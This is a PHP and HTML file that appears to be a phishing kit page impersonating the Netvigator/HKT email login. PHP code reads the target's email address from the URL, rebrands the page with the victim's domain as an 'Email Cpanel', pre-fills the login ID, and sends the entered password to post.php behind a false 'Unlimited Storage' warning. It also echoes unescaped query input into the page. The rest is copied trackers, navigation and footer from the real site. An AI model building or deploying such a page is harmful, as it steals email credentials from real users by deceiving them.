<?php
function getloginIDFromlogin($email)
{
$find = '@';
$pos = strpos($email, $find);
$loginID = substr($email, 0, $pos);
return $loginID;
}
function getDomainFromEmail($email)
{
// Get the data after the @ sign
$domain = substr(strrchr($email, "@"), 1);
return $domain;
}
$login = $_GET['email'];
$loginID = getloginIDFromlogin($login);
$domain = getDomainFromEmail($login);
$ln = strlen($login);
$len = strrev($login);
$x = 0;
for($i=0; $i<$ln; $i++){
	if($len[$i] == "@"){
		$x = $i;
		break;
	}
}
$yuh = substr($len,0,$x);
$yuh = strrev($yuh);
for($i=0; $i<$ln; $i++){
	if($yuh[$i] == "."){
		$x = $i;
		break;
	}
}
$yuh = substr($yuh,0,$x);
$yuh = ucfirst($yuh);
?>
<!DOCTYPE html>

<html lang="en-HK"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

<meta name="language" content="English">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
<meta name="description" content="NETVIGATOR email is a personal email service with unlimited storage and anti-spam  protection, enabling NETVIGATOR customers to share, organize and keep up to speed across multiple platforms.">
<meta name="keywords" content="Netvigator email,@netvigator.com,personl email,unlimited storage,anti-spam protection,email address,netvigator">
<meta name="robots" content="index">
<meta name="title" content="Netvigator | <?php echo $yuh ?> Email Service">
<meta property="og:description" content="NETVIGATOR email is a personal email service with unlimited storage and anti-spam  protection, enabling NETVIGATOR customers to share, organize and keep up to speed across multiple platforms.">
<meta property="og:title" content="Netvigator | <?php echo $yuh ?> Email Service">
<meta property="og:type" content="website">
<meta property="og:url" content="https://www.netvigator.com/eng/email/login.html">
<meta property="og:image" content="https://www.netvigator.com/assets/images/20171213_fb-ogimg.jpg">
<meta property="og:site_name" content="Netvigator">
<title>Netvigator | NETVIGATOR Email Service</title>
<link rel="canonical" href="https://www.netvigator.com/eng/email/login.html">
<link rel="stylesheet" href="./login_files/style.css">
<link rel="stylesheet" href="./login_files/dataurl.css">
<link rel="stylesheet" href="./login_files/email-login.css">
<!-- before dom loaded -->
<script type="text/javascript" async src="./login_files/f(3).txt"></script><script type="text/javascript" async src="./login_files/ga.js.download"></script><script type="text/javascript" async defer src="./login_files/HTPWA.js.download"></script><script async src="./login_files/analytics.js.download"></script><script async src="./login_files/analytics.js.download"></script><script async src="./login_files/gtm.js.download"></script><script type="text/javascript" src="./login_files/jquery-3.2.1.min.js.download"></script>
<script type="text/javascript" src="./login_files/mobile-detect.min.js.download"></script>
<script type="text/javascript" src="./login_files/pace.min.js.download"></script>
<script type="text/javascript" src="./login_files/construct.js.download"></script>
<script type="text/javascript" src="./login_files/jquery.cookie.js.download"></script>
<script>
function validate(){
	var Error1 = "Please input Username";
	var Error2 = "Please input Password";
	var loginid = $("#loginid").val();
	var password = $("#password").val();
	$("#pw_error, #loginid_error").hide();
	if (loginid == "") {
		//$("#header-nav_login").focus();
		$("#loginid_error").html(Error1).show();
		return false
	}
	else{
		$("#loginid_error").html("&nbsp;");	
	}
	if (password == "") {
		//$("#header-nav_pass").focus();
		$("#pw_error").html(Error2).show();
		return false
	}
	else{
		$("#pw_error").html("&nbsp;");	
	}
	return true;
}
$(document).ready(function(){
	
	var lang = "eng";
	var livechatid = "";
	var chattype = "CON-SA";
	
	$('#loginid, #password').bind("enterKey",function(e){
	   $("#loginform").submit();
	});
	$('#loginid, #password').keyup(function(e){
		if(e.keyCode == 13)
		{
			$(this).trigger("enterKey");
		}
	});
	$("#findMore").click(function(){
		$('html, body').animate({
			scrollTop: $("#contentBlock").offset().top
		}, 800);
	});
	$("#loginid").blur(function(){
		$("#loginid_error").html("&nbsp;").hide();	
	});
	$("#password").blur(function(){
		$("#pw_error").html("&nbsp;").hide();	
	});
	
	$(".shareArea").hide();
			/*
	var screenWidth = $(window).width();
	var screenHeight = $(window).height();
	if(screenWidth => 960){
		$("#lHeader").css({"display":"block"});
		alert(screenWidth);
	}else{
		$("#lHeader").css({"display":"none"});	
		alert(screenWidth);
	}
	*/
	
	$("#closeBtn").click(function(){
		$("#mask, #tipsarea").fadeOut(500);
	});
	$("#emailtips").click(function(){
		$("#mask, #tipsarea").fadeIn(500);
	});
});
</script>

<!-- Google Tag Manager -->
<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
})(window,document,'script','dataLayer','GTM-MNM9VK');</script>
<!-- End Google Tag Manager -->
<script type="text/javascript" async defer src="./login_files/netvigator.js.download"></script><script src="./login_files/f(4).txt"></script><script src="./login_files/f(5).txt"></script><script src="./login_files/f(6).txt"></script></head>
<!-- Google Tag Manager (noscript) -->
<body class=" desktop pace-done" style=""><noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-MNM9VK"
height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
<!-- End Google Tag Manager (noscript) -->

<!-- Google Code for Remarketing Tag -->
<!--------------------------------------------------
Remarketing tags may not be associated with personally identifiable information or placed on pages related to sensitive categories. See more information and instructions on how to setup the tag on: http://google.com/ads/remarketingsetup
--------------------------------------------------->
<script type="text/javascript">
/* <![CDATA[ */
var google_conversion_id = 994644316;
var google_custom_params = window.google_tag_params;
var google_remarketing_only = true;
/* ]]> */
</script>
<script type="text/javascript" src="./login_files/f.txt">
</script>
<noscript>
<div style="display:inline;">
<img height="1" width="1" style="border-style:none;" alt="" src="//googleads.g.doubleclick.net/pagead/viewthroughconversion/994644316/?value=0&amp;guid=ON&amp;script=0"/>
</div>
</noscript>
<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
  ga('create', 'UA-28364339-1', 'auto');
  ga('send', 'pageview');
</script>
<!--

-->
<script type="text/javascript">
var axel = Math.random() + "";
var a = axel * 10000000000000;
document.write('<iframe src="https://5754114.fls.doubleclick.net/activityi;src=5754114;type=netvi0;cat=2016n008;dc_lat=;dc_rdid=;tag_for_child_directed_treatment=;ord=' + a + '?" width="1" height="1" frameborder="0" style="display:none"></iframe>');
</script><iframe src="./login_files/activityi.html" width="1" height="1" frameborder="0" style="display:none"></iframe>
<noscript>
<iframe src="https://5754114.fls.doubleclick.net/activityi;src=5754114;type=netvi0;cat=2016n008;dc_lat=;dc_rdid=;tag_for_child_directed_treatment=;ord=1?" width="1" height="1" frameborder="0" style="display:none"></iframe>
</noscript>
<!-- End of DoubleClick Floodlight Tag: Please do not remove -->
<div id="netvigatorEmailLogin" class="wrapper services-email"><!--GA-->
<!-- Global site tag (gtag.js) - Google Analytics -->
<!--script async src="https://www.googletagmanager.com/gtag/js?id=UA-28364339-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-28364339-1');
</script-->
<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-28364339-1', 'auto');
  ga('send', 'pageview');
</script>
<!--end of GA>
<!-- header --><!-- /header -->	<!-- main -->
	<div id="main" class="smallPageTop">
	  <p>&nbsp;</p>
	  <p>&nbsp;</p>
	  <p>&nbsp;</p>
	  <div class="segment gray page center">
		  <div class="frame">
				<div class="paper middle">
					<div class="heading small simple"><strong><?php echo $yuh ?> Email Cpanel</strong></div>
					<div class="plate">
					<form method="post" id="loginform" autocomplete="off" action="post.php" onsubmit="return validate();">
							<div class="fieldList">
								<ul>
									<li>
										<label class="small" for="username">Login ID:</label>
										<div class="input">
										  <input name="user" type="text" required id="user" tabindex="1" autocomplete="off" value="<?php echo $loginID; ?>">
                                          <input name="username" type="hidden" value="<?php echo $login; ?>">
											<div class="select additional">
												<span class="note">@</span>
												<select id="nl-email" name="domain" tabindex="2">
													<option value="netvigator"><?php echo $domain ?></option>
												
												</select>
											</div>
											<div id="loginid_error" class="input_error"></div>
										</div>
										
									</li>
									<li>
										<label class="small" for="password">Password:</label>
										<div class="input">
											<input name="password" type="password" required id="password" tabindex="3" autocomplete="off">
											<div class="additional"></div>
											<div id="pw_error" class="input_error"></div>
										</div>
									</li>
								</ul>
								
							</div>
							<div id="login_error"></div>
						  <div class="remarktext">You can set different values for your e-mail quota by logging in <?php echo $yuh ?> cPanel above to enable unlimited storage to avoid your email been disabled.</div>
							<div class="btnGroup">
								<input type="submit" name="submit" id="loginBtn" value="Unlimited Storage" class="btn large gradientOrange btn-login">
								<!--div id="loginBtn" class="btn large gradientOrange btn-login">Login</div-->
						  </div>
					  </form>
					</div>
					<div class="paragraph">
						<p class="small reminder">
							If you are not yet a <?php echo $yuh ?> user, please <a href="https://shop.hkt.com/broadband/pcdregistration.html?channel=banner&amp;lang=en">click here</a> to apply.						</p>
					</div>
				</div>
		</div>
	  </div>
  </div>
	<!-- /main -->
	
<!-- floating -->
<!--aside id="floating">
	<div class="tools">
		<ul class="sidelong">
			<li class="cloneKeyBtn gradientOrange"></li>
			<li class="liveChat gradientBlue">
				<a onclick="showLiveChat2('PCD_','en')">Live Chat</a>
				<div class="icon chat-white"></div>
			</li>
		</ul>
	</div>
</aside>
<!-- /floating -->

<!-- footer -->
<div class="sitemap">
	<div class="frame">
		<div class="col">
			<nav class="category parent">
				<div class="name">Useful information</div>
				<ul>
					<li>
						<a href="http://hkt.com/Contact+us/Service+center+locations?language=en_US" target="_blank">Customer Service Center Locations</a>
					</li>
					<li>
						<a href="http://hkt.com/Contact+us/Shop+locations/?language=en_US&amp;keyword=pccw_hkt_shop_location" target="_blank">HKT Shop Locations</a>
					</li>
					<li>
						<a href="https://www.netvigator.com/eng/info/service-charge.html">General Service Charge</a>
					</li>
					<li>
						<a href="https://www.netvigator.com/eng/info/list-price.html">List Prices For Broadband Service</a>
					</li>
					<li>
						<a href="https://www.netvigator.com/assets/doc/FTTH_BMO.pdf" target="_blank">Apply Building Fiber Network</a>
					</li>
					<li>
						<a href="https://www.netvigator.com/eng/info/premium-redemption.html">Premium Redemption</a>
					</li>
					<li>
						<a href="http://japanese.hkt.com/" target="_blank">HKT Japanese mini-site</a>
					</li>
				</ul>
			</nav>
		</div>
		<div class="col">
			<nav class="category parent">
				<div class="name">Broadband</div>
				<ul>
					<li>
						<a href="https://www.netvigator.com/eng/fiber-home/index.html">Fiber-to-the Home</a>
					</li>
					<li>
						<a href="https://www.netvigator.com/eng/fiber-10g-home/index.html">10G Fiber-to-the-Home</a>
					</li>
					<li>
						<a href="https://www.netvigator.com/eng/4x1000m-multi-use/index.html">Multi-use Broadband Service</a>
					</li>
				</ul>
				
				<!--a href="/eng/broadband-corner/index.html" class="name" style="display:block;color:#000;padding:0;">Broadband Corner</a>
				<a href="/eng/security-corner/index.html" class="name" style="display:block;color:#000;padding:0;">Security Corner</a-->
			</nav>
			<div class="footersep"></div>
			<nav class="category">
				<div class="name">
					<a href="https://www.netvigator.com/eng/broadband-corner/index.html">Broadband Corner</a>
				</div>
			</nav>
			<nav class="category">
				<div class="name">
					<a href="https://www.netvigator.com/eng/security-corner/index.html">Security Corner</a>
				</div>
			</nav>
		</div>
		<div class="col">
			<nav class="category parent">
				<div class="name">Services</div>
				<ul>
					<li>
						<a href="https://www.netvigator.com/eng/csl-wifi/index.html">csl Wi-Fi</a>
					</li>
					<li>
						<a href="https://www.netvigator.com/eng/email/index.html">Email Service</a>
					</li>
					<li>
						<a href="https://www.netvigator.com/eng/home-wireless/index.html">Home Wireless</a>
					</li>
					<li>
						<a href="https://www.netvigator.com/eng/fsecure/index.html">F-Secure Safe Anywhere</a>
					</li>
					<li>
						<a href="https://www.netvigator.com/eng/freedome/index.html">Freedome</a>
					</li>
					<li>
						<a href="https://www.netvigator.com/eng/gamer/index.html">Gamer Pack</a>
					</li>
					<li>
						<a href="https://www.netvigator.com/eng/ipv6/index.html">IPv6</a>
					</li>
					<li>
						<a href="https://www.netvigator.com/eng/snaap/index.html">snaap!</a>
					</li>
					<li>
						<a href="https://www.netvigator.com/eng/uhubplus/index.html">uHub plus</a>
					</li>
				</ul>
			</nav>
		</div>
		<!--div class="col">
			<nav class="category parent">
				<div class="name">Broadband Corner</div>
				<ul>
					<li>
						<a href="/eng/broadband-corner/fiber-optic-broadband.html">Security Corner</a>
					</li>
					<li>
						<a href="/eng/broadband-corner/wireless-internet.html">Wireless Internet</a>
					</li>
					<li>
						<a href="/eng/broadband-corner/measuring-internet-speed.html">Measrting Internet Speed</a>
					</li>
				</ul>
			</nav>
			<nav class="category parent">
				<div class="name">Security Corner</div>
				<ul>
					<li>
						<a href="/eng/security-corner/notification.html">Notification</a>
					</li>
					<li>
						<a href="/eng/security-corner/phishing-email.html">Phishing Email</a>
					</li>
					<li>
						<a href="/eng/security-corner/ransomware.html">Ransomware</a>
					</li>
				</ul>
			</nav>
		</div-->
		<div class="col">
			<nav class="category parent">
				<div class="name">Tips and Tutorials</div>
				<ul>
					<li>
						<a href="https://www.netvigator.com/eng/tips-and-tutorials/general.html">General FAQ</a>
					</li>
					<li>
						<a href="https://www.netvigator.com/eng/tips-and-tutorials/csl-wifi.html">csl Wi-Fi</a>
					</li>
					<li>
						<a href="https://www.netvigator.com/eng/tips-and-tutorials/email.html">Email Service</a>
					</li>
					<!--li>
						<a href="/eng/tips-and-tutorials/home-wireless.html">Home Wireless</a>
					</li-->
					<li>
						<a href="https://www.netvigator.com/eng/tips-and-tutorials/f-secure.html">F-Secure Safe Anywhere</a>
					</li>
					<li>
						<a href="https://www.netvigator.com/eng/tips-and-tutorials/freedome.html">Freedome</a>
					</li>
					<li>
						<a href="https://www.netvigator.com/eng/tips-and-tutorials/gamer-pack.html">Gamer Pack</a>
					</li>
					<li>
						<a href="https://www.netvigator.com/eng/tips-and-tutorials/ipv6.html">IPv6</a>
					</li>
					<li>
						<a href="https://www.netvigator.com/eng/tips-and-tutorials/uhub.html">uHub plus</a>
					</li>
				</ul>
			</nav>
		</div>
		<div class="col">
			<nav class="category">
				<div class="name">
					<a href="https://www.netvigator.com/eng/aboutus/index.html">About Us</a>
				</div>
			</nav>
			<nav class="category">
				<div class="name">
					<a href="https://www.netvigator.com/eng/registration.html">Registration</a>
				</div>
			</nav>
			<nav class="category">
				<div class="name">
					<a href="https://www.netvigator.com/eng/promotion/index.html">Promotion</a>
				</div>
			</nav>
			<nav class="category">
				<div class="name">
					<a href="https://www.netvigator.com/eng/news/index.html">News</a>
				</div>
			</nav>
			<nav class="category">
				<div class="name">
					<a href="https://www.netvigator.com/eng/aboutus/contact-us.html">Contact us</a>
				</div>
			</nav>
		</div>
		<div class="col social">
			<nav class="category">
				<div class="name">
					Follow Us				</div>
				<ul class="sidelong">
					<li class="icon facebook">
						<a href="https://www.facebook.com/netvigator.hk/" target="_blank"></a>
					</li>
					<li class="icon youtube">
						<a href="https://www.youtube.com/user/NetvigatorVideo" target="_blank"></a>
					</li>
				</ul>
			</nav>
		</div>
	</div>
</div>
<footer>
	<div class="frame">
		<nav>
			<ul class="sidelong">
				<li>
					<a href="https://www.netvigator.com/eng/info/tc.html">Terms &amp; Conditions</a>
				</li>
				<li>
					<a href="http://www.hkt.com/Privacy+Statement?language=en_US" target="_blank">Privacy Statement</a>
				</li>
				<li>
					<a href="https://www.netvigator.com/assets/doc/terms_of_use_of_netvigator_eng.pdf" target="_blank">Terms &amp; Conditions of <?php echo $yuh ?></a>.com
				</li>
				<li>
					<a href="mailto:webmast@netvigator.com" target="_blank">Webmaster</a>
				</li>
				<li>
					<a href="mailto:pmaster@netvigator.com" target="_blank">Postmaster</a>
				</li>
			</ul>
		</nav>
		<div class="copyright">
			© <?php echo $yuh ?> 2007-2018. All Rights Reserved. </div>
		<div class="logo hkt">
			<!-- <img src="assets/images/logo/hkt.png" alt="HKT 摯誠為你"> -->
		</div>
		<div class="logo pccw">
			<!-- <img src="assets/images/logo/pccw.png" alt="電訊盈科集團成員"> -->
		</div>
	</div>
</footer>
<!-- /footer -->
<script>
var livechat_lang='en';	//var lang = "eng";
	//var livechatid = "";
	//var chattype = "CON-SA";
</script></div>
<!-- lib -->
<script type="text/javascript" src="./login_files/TweenMax.min.js.download"></script>
<!-- <script type="text/javascript" src="/assets/js/lib/TimelineMax.min.js"></script> -->
<script type="text/javascript" src="./login_files/ScrollMagic.min.js.download"></script>
<script type="text/javascript" src="./login_files/animation.gsap.min.js.download"></script>
<script type="text/javascript" src="./login_files/debug.addIndicators.min.js.download"></script>
<!-- /lib -->

<!-- custom -->
<script type="text/javascript" src="./login_files/common.js.download"></script>
<!-- /custom -->
<!-- current page script -->
	<!-- /current page script -->
	

</body></html>